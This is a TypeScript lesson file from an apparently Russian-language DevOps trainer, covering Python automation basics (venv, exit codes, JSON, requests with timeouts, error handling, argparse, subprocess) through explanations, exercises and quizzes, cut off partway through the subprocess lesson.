import { mkdirp, writeFile } from "../engine/vfs";
import { has, ran, ranAny } from "../missions/helpers";
import type { Lesson, World } from "../engine/types";

const DIR = "/home/devops/scripts";
const CONFIG_JSON = '{\n  "port": 8080,\n  "workers": 4,\n  "log_level": "info"\n}\n';

/** Рабочий каталог для скриптов; venv и requests уже на месте. */
function seedScripts(w: World): void {
  mkdirp(w, DIR);
  w.cwd = DIR;
  w.py = { venv: true, pkgs: ["requests"], ran: 0 };
}

/** Пустой старт: ни окружения, ни пакетов — их ставит сам ученик. */
function seedBare(w: World): void {
  mkdirp(w, DIR);
  w.cwd = DIR;
  w.py = { venv: false, pkgs: [], ran: 0 };
}

const HEALTHCHECK_OK =
  "#!/usr/bin/env python3\n" +
  "import sys\n" +
  "import requests\n" +
  "\n" +
  'URL = "http://localhost:8080/health"\n' +
  "\n" +
  "try:\n" +
  "    r = requests.get(URL, timeout=5)\n" +
  "    r.raise_for_status()\n" +
  "except requests.RequestException as e:\n" +
  '    print("сервис недоступен:", e)\n' +
  "    sys.exit(1)\n" +
  "\n" +
  'print("healthcheck ок:", r.status_code)\n';

const CRASH_FIXED =
  "#!/usr/bin/env python3\n" +
  "import sys\n" +
  "import requests\n" +
  "\n" +
  'URL = "http://localhost:8080/health"\n' +
  "\n" +
  "try:\n" +
  "    r = requests.get(URL, timeout=3)\n" +
  "    r.raise_for_status()\n" +
  "except requests.RequestException as e:\n" +
  '    print("API недоступно:", e)\n' +
  "    sys.exit(1)\n" +
  "\n" +
  'print("ответ получен:", r.status_code)\n';

const EXPORT_BROKEN =
  "#!/usr/bin/env python3\n" +
  "import json\n" +
  "import requests\n" +
  "\n" +
  'with open("/etc/app/config.json") as f:\n' +
  "    cfg = json.load(f)\n" +
  "\n" +
  "# TODO: поменять на реальный адрес экспортёра\n" +
  'url = "http://metrics-nonexistent:9999/export"\n' +
  "r = requests.get(url)\n" +
  'print("выгружено строк:", len(r.text))\n';

const EXPORT_FIXED =
  "#!/usr/bin/env python3\n" +
  "import json\n" +
  "import sys\n" +
  "import requests\n" +
  "\n" +
  'with open("/etc/app/config.json") as f:\n' +
  "    cfg = json.load(f)\n" +
  "\n" +
  'url = "http://localhost:9091/export"\n' +
  "try:\n" +
  "    r = requests.get(url, timeout=5)\n" +
  "    r.raise_for_status()\n" +
  "except requests.RequestException as e:\n" +
  '    print("экспортёр недоступен:", e)\n' +
  "    sys.exit(1)\n" +
  "\n" +
  'print("выгружено строк:", len(r.text))\n';

const DEPLOY_OK =
  "#!/usr/bin/env python3\n" +
  "import argparse\n" +
  "\n" +
  'parser = argparse.ArgumentParser(description="выкатить сервис")\n' +
  'parser.add_argument("--env", required=True, choices=["staging", "prod"])\n' +
  'parser.add_argument("--version", default="latest")\n' +
  "args = parser.parse_args()\n" +
  "\n" +
  'print("деплой", args.version, "в", args.env)\n';

const SVC_OK =
  "#!/usr/bin/env python3\n" +
  "import subprocess\n" +
  "import sys\n" +
  "\n" +
  "result = subprocess.run(\n" +
  '    ["systemctl", "is-active", "nginx"],\n' +
  "    capture_output=True,\n" +
  "    text=True,\n" +
  ")\n" +
  'print("nginx:", result.stdout.strip())\n' +
  "sys.exit(0 if result.returncode == 0 else 1)\n";

const MONITOR_OK =
  "#!/usr/bin/env python3\n" +
  "import argparse\n" +
  "import sys\n" +
  "import requests\n" +
  "\n" +
  'parser = argparse.ArgumentParser(description="проверка здоровья сервиса")\n' +
  'parser.add_argument("--url", required=True)\n' +
  'parser.add_argument("--timeout", type=int, default=5)\n' +
  "args = parser.parse_args()\n" +
  "\n" +
  "try:\n" +
  "    r = requests.get(args.url, timeout=args.timeout)\n" +
  "    r.raise_for_status()\n" +
  "except requests.RequestException as e:\n" +
  '    print("НЕ ОК:", e)\n' +
  "    sys.exit(1)\n" +
  "\n" +
  'print("ОК:", r.status_code)\n' +
  "sys.exit(0)\n";

export const act14: Lesson[] = [
  {
    id: "14.1",
    act: 14,
    title: "Зачем Python, если есть bash",
    xp: 15,
    intro: "Bash хорош, чтобы склеить несколько команд. Всё, что сложнее, пишут на Python.",
    steps: [
      {
        kind: "say",
        text:
          "Ты уже писал bash-скрипты в Акте 3. Bash незаменим, когда нужно быстро\n" +
          "связать несколько утилит: cp, tar, grep, systemctl — пять-десять строк,\n" +
          "запустил из крона и забыл.",
      },
      {
        kind: "say",
        text:
          "Bash становится обузой, как только появляется НАСТОЯЩАЯ логика:\n\n" +
          "  • разобрать JSON или YAML (ответ API, конфиг) — в bash это ад из grep/sed\n" +
          "  • сходить в HTTP API, обработать коды ответа, повторить при ошибке\n" +
          "  • вложенные условия, работа со словарями и списками\n" +
          "  • скрипт вырос за 30–50 строк, его читают и правят несколько человек\n" +
          "  • нужны тесты\n\n" +
          "Здесь берут Python: он читается, у него есть библиотеки и нормальные ошибки.",
      },
      {
        kind: "say",
        text:
          "Для DevOps Python — это «швейцарский нож» автоматизации:\n\n" +
          "  requests    — сходить в API / проверить сервис\n" +
          "  json / yaml — прочитать структурированные данные\n" +
          "  subprocess  — безопасно вызвать системную команду\n" +
          "  argparse    — сделать из скрипта инструмент с --help и аргументами\n\n" +
          "В этом акте разберём каждый по очереди и соберём рабочий CLI-инструмент.",
      },
      {
        kind: "quiz",
        text: "Когда разумно перейти с bash на Python?",
        options: [
          "Появилась логика: разбор JSON/API, вложенные условия, обработка ошибок, скрипт большой и общий",
          "Всегда — bash использовать нельзя",
          "Только если bash физически не установлен",
        ],
        answer: 0,
        explain:
          "Bash — для короткой склейки команд. Логика, данные, ошибки, размер, тесты — сигнал переходить на Python.",
      },
    ],
  },
  {
    id: "14.2",
    act: 14,
    title: "venv и pip: изолируем зависимости",
    xp: 20,
    intro: "Каждый проект — своё окружение с нужными версиями пакетов. Системный Python не трогаем.",
    setup: seedBare,
    steps: [
      {
        kind: "say",
        text:
          "У проекта A нужен requests 2.31, у проекта B — старый requests 2.20.\n" +
          "Если ставить пакеты глобально (в системный Python), они конфликтуют, а ещё\n" +
          "можно сломать пакеты самой операционной системы.\n\n" +
          "Решение —  виртуальное окружение (venv): отдельная папка со своим Python\n" +
          "и своим набором пакетов, привязанная к проекту.",
      },
      {
        kind: "say",
        text:
          "Создание окружения:\n\n" +
          "  python3 -m venv .venv          # создать папку .venv в проекте\n" +
          "  source .venv/bin/activate      # войти в него (в приглашении появится (.venv))\n\n" +
          "Дальше всё, что ставит pip, попадает только в  .venv , а не в систему.\n" +
          "Папку  .venv  в git не кладут — она восстанавливается из requirements.txt.",
      },
      {
        kind: "do",
        text: "Задача: создай виртуальное окружение в папке  .venv .",
        check: (w) => !!w.py?.venv,
        answer: "python3 -m venv .venv",
        hint: "Команда:  python3 -m venv .venv",
      },
      {
        kind: "say",
        text:
          "Окружение активировано (в тренажёре это происходит сразу). Теперь ставим\n" +
          "пакеты через  pip :\n\n" +
          "  pip install requests          # поставить пакет\n" +
          "  pip list                      # что стоит\n" +
          "  pip freeze                    # то же, но в формате requests==2.31.0",
      },
      {
        kind: "do",
        text: "Задача: установи пакет  requests .",
        check: (w) => !!w.py?.pkgs.includes("requests"),
        answer: "pip install requests",
        hint: "Команда:  pip install requests",
      },
      {
        kind: "watch",
        run: "pip list",
        note: "pip показал установленные пакеты и их версии. Пока только requests.",
      },
      {
        kind: "quiz",
        text: "Зачем нужно виртуальное окружение (venv)?",
        options: [
          "Изолирует пакеты проекта: свои версии, не конфликтуют с другими проектами и не ломают системный Python",
          "Ускоряет выполнение скриптов",
          "Заменяет git для хранения кода",
        ],
        answer: 0,
        explain:
          "venv = отдельный набор зависимостей на проект. Список версий фиксируют в requirements.txt (урок 14.10).",
      },
    ],
  },
  {
    id: "14.3",
    act: 14,
    title: "Первый скрипт и коды возврата",
    xp: 25,
    intro: "Структура python-скрипта и главное для автоматизации — чем он завершился.",
    setup: seedScripts,
    steps: [
      {
        kind: "say",
        text:
          "Скелет скрипта для автоматизации:\n\n" +
          "  #!/usr/bin/env python3        # шебанг — как в bash\n" +
          "  import sys\n" +
          "\n" +
          "  def main():\n" +
          "      ...\n" +
          "\n" +
          '  if __name__ == "__main__":    # запускается только при прямом вызове\n' +
          "      main()\n",
      },
      {
        kind: "say",
        text:
          "Как в bash (Акт 3), у скрипта есть  код возврата :\n\n" +
          "  выход без ошибок           -> 0\n" +
          "  sys.exit(1)  (или падение) -> не 0\n\n" +
          "Крон, CI и системы мониторинга смотрят именно на код: 0 — «ок»,\n" +
          "любое другое число — «что-то сломалось, реагируй».",
      },
      {
        kind: "do",
        text:
          "Задача: создай  disk_ok.py . Набери:\n" +
          "edit disk_ok.py\n" +
          "Пусть скрипт печатает строку и завершается  sys.exit(0) . Сохрани.",
        check: has(`${DIR}/disk_ok.py`, /sys\.exit\(\s*0\s*\)/),
        answer:
          "#!/usr/bin/env python3\n" +
          "import sys\n" +
          "\n" +
          "free_percent = 42\n" +
          'print("свободно на диске:", free_percent, "%")\n' +
          "sys.exit(0)\n",
        editFile: `${DIR}/disk_ok.py`,
        hint: "В  edit disk_ok.py  впиши import sys, один print(...) и последней строкой  sys.exit(0) .",
      },
      {
        kind: "do",
        text: "Задача: запусти скрипт —  python3 disk_ok.py",
        check: ran(/^python3?\s+disk_ok\.py/),
        answer: "python3 disk_ok.py",
        hint: "Команда:  python3 disk_ok.py",
      },
      {
        kind: "quiz",
        text: "Скрипт завершился  sys.exit(1) . Что это означает для запустившего его крона?",
        options: [
          "Скрипт сообщил об ошибке: 0 — успех, не 0 — сбой; на этом строятся алерты и остановка пайплайна",
          "Выполнена ровно одна инструкция",
          "Всё прошло успешно",
        ],
        answer: 0,
        explain:
          "Код возврата — единственный сигнал, который видит автоматика. Молча вернуть 0 при ошибке — скрыть аварию.",
      },
    ],
  },
  {
    id: "14.4",
    act: 14,
    title: "Читаем структурированные данные (JSON)",
    xp: 25,
    intro: "Конфиги и ответы API — это JSON/YAML. Их разбирают библиотекой, а не grep.",
    setup: (w) => {
      seedScripts(w);
      mkdirp(w, "/etc/app");
      writeFile(w, "/etc/app/config.json", CONFIG_JSON);
      w.templates = {
        [`${DIR}/read_config.py`]:
          "# ЗАДАЧА: открой /etc/app/config.json, разбери json.load,\n" +
          "# напечатай значения port и workers. Комментарий сотри.\n",
      };
    },
    steps: [
      {
        kind: "say",
        text:
          "Файл  /etc/app/config.json :\n\n" +
          "  {\n" +
          '    "port": 8080,\n' +
          '    "workers": 4,\n' +
          '    "log_level": "info"\n' +
          "  }\n\n" +
          "Достать отсюда порт через grep/sed можно, но это хрупко: перенос строки,\n" +
          "вложенность, кавычки, числа против строк — регулярки на этом ломаются.",
      },
      {
        kind: "say",
        text:
          "Правильно — модулем  json  из стандартной библиотеки:\n\n" +
          "  import json\n" +
          '  with open("/etc/app/config.json") as f:\n' +
          "      cfg = json.load(f)      # json.load — из файла; json.loads — из строки\n" +
          "\n" +
          '  print(cfg["port"])          # cfg это словарь: cfg["port"] -> 8080\n\n' +
          "Для YAML то же самое: import yaml, yaml.safe_load(f).",
      },
      {
        kind: "do",
        text:
          "Задача: создай  read_config.py . Набери:\n" +
          "edit read_config.py\n" +
          "Открой /etc/app/config.json, разбери json.load, напечатай port и workers.",
        check: has(`${DIR}/read_config.py`, /json\.load\(/),
        answer:
          "#!/usr/bin/env python3\n" +
          "import json\n" +
          "\n" +
          'with open("/etc/app/config.json") as f:\n' +
          "    cfg = json.load(f)\n" +
          "\n" +
          'print("порт:", cfg["port"], "воркеров:", cfg["workers"])\n',
        editFile: `${DIR}/read_config.py`,
        hint: 'В edit read_config.py: import json, with open(...) as f, cfg = json.load(f), затем print с cfg["port"].',
      },
      {
        kind: "do",
        text: "Задача: запусти —  python3 read_config.py",
        check: ran(/^python3?\s+read_config\.py/),
        answer: "python3 read_config.py",
        hint: "Команда:  python3 read_config.py",
      },
      {
        kind: "quiz",
        text: "Почему JSON-конфиг разбирают модулем json, а не grep/sed?",
        options: [
          "json понимает вложенность, типы и кавычки; регулярки ломаются на первой же нетривиальной структуре",
          "grep не умеет читать файлы .json",
          "Так скрипт работает быстрее",
        ],
        answer: 0,
        explain: "Структурированные данные — структурированным парсером. Это надёжно и читается.",
      },
    ],
  },
  {
    id: "14.5",
    act: 14,
    title: "requests: проверяем, что сервис жив",
    xp: 30,
    intro: "HTTP-запрос из Python — и обязательный timeout, без которого скрипт зависает навсегда.",
    setup: (w) => {
      seedScripts(w);
      w.templates = {
        [`${DIR}/healthcheck.py`]:
          "# ЗАДАЧА: сходи GET на http://localhost:8080/health с timeout=5,\n" +
          "# проверь r.raise_for_status(), поймай requests.RequestException и sys.exit(1).\n",
      };
    },
    steps: [
      {
        kind: "say",
        text:
          "Библиотека  requests  — стандарт для HTTP в Python:\n\n" +
          "  import requests\n" +
          '  r = requests.get("http://localhost:8080/health", timeout=5)\n' +
          "  r.status_code        # 200, 500, ...\n" +
          "  r.raise_for_status() # бросит исключение, если код 4xx/5xx\n" +
          "  r.json()             # разобрать тело как JSON",
      },
      {
        kind: "say",
        text:
          "Главное правило:  timeout=  указывают ВСЕГДА.\n\n" +
          "Без timeout запрос к зависшему сервису висит бесконечно. В кроне это значит:\n" +
          "новый процесс каждую минуту, все висят, через сутки сервер забит зомби-задачами.\n" +
          "timeout=5 — «ждём ответа 5 секунд, дальше считаем сервис недоступным».",
      },
      {
        kind: "do",
        text:
          "Задача: создай  healthcheck.py . Набери:\n" +
          "edit healthcheck.py\n" +
          "GET на http://localhost:8080/health с  timeout=5 , raise_for_status(),\n" +
          "перехвати requests.RequestException и  sys.exit(1) . Сохрани.",
        check: (w) =>
          has(`${DIR}/healthcheck.py`, /requests\.get\(/)(w) &&
          has(`${DIR}/healthcheck.py`, /timeout\s*=/)(w),
        answer: HEALTHCHECK_OK,
        editFile: `${DIR}/healthcheck.py`,
        hint: "Обязательно  requests.get(URL, timeout=5)  и блок  try/except requests.RequestException .",
      },
      {
        kind: "do",
        text: "Задача: запусти проверку —  python3 healthcheck.py",
        check: ran(/^python3?\s+healthcheck\.py/),
        answer: "python3 healthcheck.py",
        hint: "Команда:  python3 healthcheck.py",
      },
      {
        kind: "quiz",
        text: "Зачем в  requests.get(...)  почти всегда пишут  timeout= ?",
        options: [
          "Без него запрос к зависшему сервису ждёт вечно; в кроне копятся зависшие процессы",
          "timeout ускоряет ответ сервера",
          "Без timeout запрос вообще не отправится",
        ],
        answer: 0,
        explain:
          "Нет timeout — нет гарантии, что скрипт когда-нибудь завершится. Это классическая причина инцидентов.",
      },
    ],
  },
  {
    id: "14.6",
    act: 14,
    title: "Обработка ошибок: try/except и понятный выход",
    xp: 45,
    intro:
      "Ошибку не глушат и не игнорируют — ловят конкретную, логируют и выходят осмысленным кодом. " +
      "Это тот самый урок, из-за которого аварии становятся невидимыми.",
    setup: (w) => {
      seedScripts(w);
      writeFile(
        w,
        `${DIR}/crash.py`,
        "#!/usr/bin/env python3\n" +
          "import requests\n" +
          "\n" +
          'r = requests.get("http://api-nonexistent:9999/data")\n' +
          'print("получено:", len(r.text))\n',
      );
      w.templates = {
        [`${DIR}/crash.py`]:
          "#!/usr/bin/env python3\n" +
          "import requests\n" +
          "\n" +
          "# TODO: обернуть в try/except requests.RequestException, добавить timeout и sys.exit(1)\n" +
          'r = requests.get("http://api-nonexistent:9999/data")\n' +
          'print("получено:", len(r.text))\n',
      };
    },
    steps: [
      {
        kind: "say",
        text:
          "Непойманное исключение = трейсбек в лог и код возврата 1. Иногда этого хватает,\n" +
          "но чаще нужно понятное сообщение и осмысленный код:\n\n" +
          "  try:\n" +
          "      r = requests.get(url, timeout=5)\n" +
          "      r.raise_for_status()\n" +
          "  except requests.RequestException as e:\n" +
          '      print("сервис недоступен:", e)\n' +
          "      sys.exit(1)\n",
      },
      {
        kind: "say",
        text:
          "Что НЕЛЬЗЯ делать:\n\n" +
          "  except Exception:\n" +
          "      pass          # << проглотили любую ошибку\n\n" +
          "Так скрипт «успешно» завершается кодом 0, данные не обновились, а понять,\n" +
          "что сломалось, невозможно. Это худшая практика — на собеседовании назовут\n" +
          "«тихим сбоем». Лови КОНКРЕТНОЕ исключение и всегда оставляй след в логе.",
      },
      {
        kind: "say",
        text:
          "ИСТОРИЯ ИЗ ЖИЗНИ. Скрипт  backup_db.py  каждую ночь делал дамп базы и клал\n" +
          "его в S3. Кто-то когда-то обернул всё тело скрипта так:\n\n" +
          "  try:\n" +
          "      dump_database()\n" +
          "      upload_to_s3()\n" +
          "  except Exception:\n" +
          "      pass\n\n" +
          "Полгода крон рапортовал «ок» зелёным кодом 0. Потом у S3 сменили ключ\n" +
          "доступа — upload начал падать с 403. Скрипт исправно глотал это и выходил\n" +
          "нулём. Узнали через 4 месяца, когда база реально легла и понадобился бэкап.\n" +
          "Последний рабочий дамп был четырёхмесячной давности.\n\n" +
          "Одна строчка  pass  стоила четырёх месяцев данных. Именно поэтому обработку\n" +
          "ошибок спрашивают на каждом втором собеседовании.",
      },
      {
        kind: "say",
        text:
          "Пример 1 — ФАЙЛ, которого нет. Конфиг может отсутствовать, и это нормальная\n" +
          "ситуация: берём значения по умолчанию, но ОБЯЗАТЕЛЬНО говорим об этом вслух.\n\n" +
          "  import json\n" +
          "  try:\n" +
          '      with open("/etc/app/config.json") as f:\n' +
          "          cfg = json.load(f)\n" +
          "  except FileNotFoundError:\n" +
          '      print("конфига нет, беру значения по умолчанию")\n' +
          '      cfg = {"port": 8080, "workers": 2}\n' +
          "  except json.JSONDecodeError as e:\n" +
          '      print("конфиг битый, чинить руками:", e)\n' +
          "      sys.exit(1)\n\n" +
          "Смотри: два РАЗНЫХ исключения — два разных решения. Файла нет — работаем\n" +
          "дальше с дефолтами. Файл есть, но внутри мусор — это уже ошибка человека,\n" +
          "молча подставлять дефолты нельзя, выходим с кодом 1.",
      },
      {
        kind: "say",
        text:
          "Пример 2 — КЛЮЧА нет в ответе API. Сервис вернул 200, но формат ответа\n" +
          "поменялся, и привычного поля  status  там больше нет:\n\n" +
          "  data = r.json()\n" +
          "  try:\n" +
          '      status = data["status"]\n' +
          "  except KeyError:\n" +
          '      print("API вернул неожиданный формат:", data)\n' +
          "      sys.exit(1)\n\n" +
          "Или короче, без try, если отсутствие поля — штатный случай:\n\n" +
          '  status = data.get("status", "unknown")\n\n' +
          "Правило то же, что с os.environ (урок 14.14): обязательное поле — через  [] \n" +
          "и падаем явно, необязательное — через  .get()  с дефолтом.",
      },
      {
        kind: "say",
        text:
          "Пример 3 — ЧУЖАЯ команда вернула не то. Ошибка не обязана быть исключением:\n\n" +
          '  result = subprocess.run(["systemctl", "is-active", "nginx"],\n' +
          "                          capture_output=True, text=True)\n" +
          "  if result.returncode != 0:\n" +
          '      print("nginx не активен:", result.stdout.strip())\n' +
          "      sys.exit(1)\n\n" +
          "Тут никакого исключения Python не бросит — вернётся объект с кодом 3.\n" +
          "Проверить код возврата — твоя работа. Это тот же  set -e  из Акта 3,\n" +
          "только руками.",
      },
      {
        kind: "say",
        text:
          "ТИПИЧНАЯ ОШИБКА НОВИЧКА — обернуть ВЕСЬ скрипт в один гигантский try:\n\n" +
          "  try:\n" +
          "      # 60 строк всего подряд\n" +
          "  except Exception as e:\n" +
          '      print("что-то пошло не так:", e)\n' +
          "      sys.exit(1)\n\n" +
          "Формально ошибка не проглочена — уже лучше, чем  pass . Но диагностики ноль:\n" +
          "«что-то пошло не так» не скажет, упал ли запрос к API, чтение конфига или\n" +
          "запись файла. Оборачивай маленькие куски и лови конкретику.\n\n" +
          "Вторая частая ошибка — порядок except. Питон берёт ПЕРВЫЙ подходящий:\n\n" +
          "  except Exception:      # << поймает вообще всё\n" +
          "      ...\n" +
          "  except FileNotFoundError:   # << сюда управление уже не дойдёт\n" +
          "      ...\n\n" +
          "Конкретные исключения — выше, общие — ниже. Иначе частные ветки мертвы.",
      },
      {
        kind: "say",
        text:
          "Ещё две конструкции, про которые спрашивают:\n\n" +
          "  finally:  — выполнится ВСЕГДА, упало или нет. Для уборки: закрыть\n" +
          "              соединение, снять lock-файл, удалить временный каталог.\n" +
          "  raise     — «поймал, дописал контекст в лог и пробросил дальше».\n" +
          "              Полезно в функции: она не решает, выходить ли из программы.\n\n" +
          "  try:\n" +
          "      lock_acquire()\n" +
          "      do_work()\n" +
          "  except OSError as e:\n" +
          '      print("работа не выполнена:", e)\n' +
          "      raise                 # пусть решает вызывающий код\n" +
          "  finally:\n" +
          "      lock_release()        # снимаем lock в любом случае\n",
      },
      {
        kind: "quiz",
        text:
          "Скрипт читает конфиг. Файла может не быть (это штатно), а может быть битый JSON.\n" +
          "Как правильно?",
        options: [
          "Два отдельных except: FileNotFoundError -> дефолты и сообщение, JSONDecodeError -> сообщение и sys.exit(1)",
          "Один except Exception: pass — не важно, что именно сломалось",
          "Не ловить ничего: если что, трейсбек всё объяснит",
        ],
        answer: 0,
        explain:
          "Разные причины — разная реакция. Отсутствие файла лечится дефолтами, битый JSON правит человек.",
      },
      {
        kind: "quiz",
        text: "В каком порядке должны идти ветки except?",
        options: [
          "Сначала конкретные (FileNotFoundError), потом общие (Exception) — иначе общая перехватит всё и частные ветки не сработают",
          "Сначала общие, потом конкретные — Python выберет самую точную",
          "Порядок не важен, Python сам разберётся",
        ],
        answer: 0,
        explain:
          "Python берёт первый подошедший except сверху вниз. except Exception наверху делает все ветки ниже мёртвым кодом.",
      },
      {
        kind: "watch",
        run: "python3 crash.py",
        note:
          "Скрипт упал: запрос без timeout, адрес недоступен, исключение не поймано —\n" +
          "трейсбек и код 1. Пользователь видит только непонятную простыню.",
      },
      {
        kind: "do",
        text:
          "Задача: почини  crash.py . Набери:\n" +
          "edit crash.py\n" +
          "Добавь timeout, оберни в  try/except requests.RequestException , в except —\n" +
          "понятный print и  sys.exit(1) . Сохрани.",
        check: (w) =>
          has(`${DIR}/crash.py`, /except\s+requests/)(w) && has(`${DIR}/crash.py`, /timeout\s*=/)(w),
        answer: CRASH_FIXED,
        editFile: `${DIR}/crash.py`,
        hint: "Оберни requests.get(URL, timeout=3) в try, поймай  except requests.RequestException as e , внутри — sys.exit(1).",
      },
      {
        kind: "do",
        text: "Задача: запусти снова —  python3 crash.py . Теперь ошибка обработана, а не свалена трейсбеком.",
        check: ranAny(/^python3?\s+crash\.py/),
        answer: "python3 crash.py",
        hint: "Команда:  python3 crash.py  — вывод станет понятным, код 1 (сервиса и правда нет).",
      },
      {
        kind: "quiz",
        text: "Чем плох  except Exception: pass ?",
        options: [
          "Прячет любую ошибку: скрипт завершается кодом 0, данные не обновились, причину не найти",
          "Это синтаксическая ошибка, скрипт не запустится",
          "Замедляет выполнение",
        ],
        answer: 0,
        explain:
          "Ловим конкретное исключение, пишем в лог, выходим не-нулём. Глушитель ошибок = невидимая авария.",
      },
    ],
  },
  {
    id: "14.7",
    act: 14,
    title: "argparse: делаем настоящий CLI-инструмент",
    xp: 42,
    intro: "Разбирать sys.argv руками — боль. argparse даёт --help, проверку и понятные ошибки.",
    setup: (w) => {
      seedScripts(w);
      w.templates = {
        [`${DIR}/deploy.py`]:
          "# ЗАДАЧА: argparse с обязательным --env (choices staging/prod)\n" +
          "# и необязательным --version (default latest). Комментарий сотри.\n",
      };
    },
    steps: [
      {
        kind: "say",
        text:
          "Скрипт, которым пользуются люди, должен принимать аргументы по-человечески:\n" +
          "с  --help , проверкой обязательных, понятной ошибкой при опечатке.\n" +
          "Разбор  sys.argv[1]  вручную всё это не даёт и падает с IndexError.",
      },
      {
        kind: "say",
        text:
          "Модуль  argparse  из стандартной библиотеки:\n\n" +
          "  import argparse\n" +
          '  parser = argparse.ArgumentParser(description="выкатить сервис")\n' +
          '  parser.add_argument("--env", required=True, choices=["staging", "prod"])\n' +
          '  parser.add_argument("--version", default="latest")\n' +
          "  args = parser.parse_args()\n" +
          "  # дальше: args.env, args.version\n",
      },
      {
        kind: "say",
        text:
          "ИСТОРИЯ ИЗ ЖИЗНИ. Скрипт выката читал окружение как  sys.argv[1] :\n\n" +
          "  env = sys.argv[1]\n" +
          "  deploy(env)\n\n" +
          "Дежурный ночью выкатывал фикс и по привычке набрал:\n\n" +
          "  python3 deploy.py --env staging\n\n" +
          'Скрипт взял  sys.argv[1] , то есть строку  "--env" , подставил её как имя\n' +
          "окружения — и, не найдя такого, свалился в ветку «по умолчанию = prod».\n" +
          "Непроверенный фикс уехал в прод в 3 часа ночи.\n\n" +
          "С argparse этого физически не случилось бы: опечатка или лишний аргумент —\n" +
          "и argparse просто не пустит дальше, с кодом 2 и объяснением.",
      },
      {
        kind: "say",
        text:
          "Пример 1 — ЧИСЛА и ФЛАГИ. argparse умеет приводить типы и делать «галочки»:\n\n" +
          '  parser.add_argument("--timeout", type=int, default=5,\n' +
          '                      help="сколько секунд ждать ответа")\n' +
          '  parser.add_argument("--dry-run", action="store_true",\n' +
          '                      help="показать, что будет сделано, но не делать")\n\n' +
          '  args.timeout   -> 5 (уже int, а не строка "5")\n' +
          "  args.dry_run   -> True/False. Обрати внимание: дефис в  --dry-run \n" +
          "                    превращается в подчёркивание в  args.dry_run .\n\n" +
          'Без  type=int  ты получил бы строку и однажды сравнил  "10" < "9"  — это,\n' +
          "внезапно, True, потому что строки сравниваются посимвольно.",
      },
      {
        kind: "say",
        text:
          "Пример 2 — ПОЗИЦИОННЫЕ аргументы и списки:\n\n" +
          '  parser.add_argument("config")                    # обязательный, без --\n' +
          '  parser.add_argument("--host", action="append")   # можно указать несколько раз\n\n' +
          "  python3 check.py prod.yaml --host web1 --host web2\n" +
          '  args.config -> "prod.yaml"\n' +
          '  args.host   -> ["web1", "web2"]\n\n' +
          "Позиционные — для того, без чего команда не имеет смысла (имя файла).\n" +
          "Опции с  --  — для всего остального. Это негласное соглашение всех\n" +
          "unix-утилит, и пользователи твоего скрипта его уже знают.",
      },
      {
        kind: "say",
        text:
          "Пример 3 — ПОДКОМАНДЫ, как  git commit  /  git push :\n\n" +
          '  sub = parser.add_subparsers(dest="command", required=True)\n' +
          '  p_deploy = sub.add_parser("deploy")\n' +
          '  p_deploy.add_argument("--env", required=True)\n' +
          '  p_status = sub.add_parser("status")\n\n' +
          "  python3 tool.py deploy --env prod\n" +
          "  python3 tool.py status\n\n" +
          '  if args.command == "deploy": ...\n\n' +
          "Так один скрипт становится небольшой утилитой на всю команду, вместо\n" +
          "десятка разрозненных файлов  deploy.py ,  status.py ,  rollback.py .",
      },
      {
        kind: "say",
        text:
          "ТИПИЧНАЯ ОШИБКА НОВИЧКА — писать проверки руками, дублируя argparse:\n\n" +
          "  args = parser.parse_args()\n" +
          '  if args.env not in ("staging", "prod"):     # << лишнее\n' +
          '      print("неверное окружение")\n' +
          "      sys.exit(1)\n\n" +
          'Ровно это делает  choices=["staging", "prod"] , причём с нормальным\n' +
          "сообщением и кодом 2. Правило: если argparse умеет — не пиши сам.\n\n" +
          "Вторая ошибка — забыть  help=  у аргументов. Скрипт вроде есть,  --help \n" +
          "вроде работает, но показывает голые названия. Через месяц ты сам не\n" +
          "вспомнишь, что  --level  ждёт число от 0 до 3.",
      },
      {
        kind: "do",
        text:
          "Задача: создай  deploy.py . Набери:\n" +
          "edit deploy.py\n" +
          "Обязательный  --env  (choices staging/prod), необязательный  --version  (default latest),\n" +
          "в конце — print с обоими значениями. Сохрани.",
        check: has(`${DIR}/deploy.py`, /add_argument\(\s*["']--env["'][^\n]*required\s*=\s*True/),
        answer: DEPLOY_OK,
        editFile: `${DIR}/deploy.py`,
        hint: 'Ключевая строка:  parser.add_argument("--env", required=True, choices=["staging", "prod"]) .',
      },
      {
        kind: "watch",
        run: "python3 deploy.py",
        note:
          "Запустили без  --env  — argparse сам не пустил и объяснил: «the following\n" +
          "arguments are required: --env», код возврата 2. Не пришлось писать ни строчки проверки.",
      },
      {
        kind: "watch",
        run: "python3 deploy.py --help",
        note:
          "А это  --help , который ты не писал: argparse собрал его сам из описаний\n" +
          "аргументов. Любой коллега теперь разберётся со скриптом без чтения кода —\n" +
          "ровно так же, как он привык делать с ls, docker и kubectl.",
      },
      {
        kind: "quiz",
        text: 'Что даёт  parser.add_argument("--timeout", type=int, default=5) ?',
        options: [
          "args.timeout будет числом (а не строкой), при опечатке вроде --timeout abc argparse сам ругнётся, а без аргумента подставится 5",
          "Скрипт будет завершаться через 5 секунд",
          "Ничего, type=int нужен только для документации",
        ],
        answer: 0,
        explain:
          "type= приводит и проверяет значение, default= задаёт значение по умолчанию. Строковое '10' < '9' — классический баг без type=int.",
      },
      {
        kind: "do",
        text: "Задача: запусти правильно —  python3 deploy.py --env prod",
        check: ran(/^python3?\s+deploy\.py\s+--env\s+prod/),
        answer: "python3 deploy.py --env prod",
        hint: "Команда:  python3 deploy.py --env prod",
      },
      {
        kind: "quiz",
        text: "Почему argparse лучше, чем брать  sys.argv[1]  напрямую?",
        options: [
          "Даёт --help, проверку обязательных и choices, понятные ошибки и не падает с IndexError",
          "argparse работает без импорта",
          "sys.argv вообще не содержит аргументов",
        ],
        answer: 0,
        explain: "argparse превращает скрипт в предсказуемый инструмент с самодокументацией.",
      },
    ],
  },
  {
    id: "14.8",
    act: 14,
    title: "subprocess: безопасно звать системные команды",
    xp: 45,
    intro: "Иногда из Python нужно вызвать systemctl или git. Делают это списком аргументов, без shell=True.",
    setup: (w) => {
      seedScripts(w);
      w.templates = {
        [`${DIR}/svc_state.py`]:
          "# ЗАДАЧА: subprocess.run(['systemctl', 'is-active', 'nginx'], capture_output=True, text=True)\n" +
          "# напечатай result.stdout, верни код по result.returncode. Комментарий сотри.\n",
      };
    },
    steps: [
      {
        kind: "say",
        text:
          "Вызвать внешнюю программу из Python — модуль  subprocess :\n\n" +
          "  import subprocess\n" +
          "  result = subprocess.run(\n" +
          '      ["systemctl", "is-active", "nginx"],   # СПИСОК аргументов\n' +
          "      capture_output=True, text=True,        # забрать stdout/stderr как строки\n" +
          "  )\n" +
